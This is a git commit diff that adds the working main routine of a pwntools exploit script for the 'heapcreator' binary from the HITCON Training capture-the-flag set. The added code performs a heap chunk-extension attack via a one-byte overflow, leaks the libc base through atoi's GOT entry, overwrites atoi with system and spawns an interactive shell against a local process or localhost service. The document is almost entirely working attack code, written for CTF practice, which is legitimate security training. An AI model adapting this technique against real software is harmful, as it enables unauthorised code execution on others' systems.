233c0ac4a56803d4abd152cf9d5683f1f98723cb
M4xW4n9 <aboultraman@gmail.com>
2018-03-09 20:03:43 +0800

    chunk extend

--- hitconTraining_heapcreator/exp.py
+++ hitconTraining_heapcreator/exp.py
@@ -12,7 +12,7 @@ if sys.argv[1] == "l":
     io = process("./heapcreator")
     elf = ELF("./heapcreator")
     #  libc = ELF("/lib/i386-linux-gnu/libc.so.6")
-    #  libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
 
 else:
     io = remote("localhost", 9999)
@@ -42,3 +42,22 @@ def delete(idx):
     io.sendlineafter(" :", "4")
     io.sendlineafter(" :", str(idx))
 
+if __name__ == "__main__":
+    create(0x18, "0000")
+    create(0x10, "1111")
+
+    edit(0, 'a' * 0x18 + "\x41")
+
+    delete(1)
+    payload = 4 * p64(0) + p64(0x30) + p64(elf.got["atoi"])
+    create(0x30, payload)
+    show(1)
+    libcBase = u64(io.recvuntil("\x7f")[-6: ].ljust(8, "\x00")) - libc.symbols["atoi"]
+    success("libcBase -> {:x}".format(libcBase))
+
+    systemAddr = libcBase + libc.symbols["system"]
+    edit(1, p64(systemAddr))
+    io.sendlineafter(" :", "$0")
+
+    io.interactive()
+    io.close()
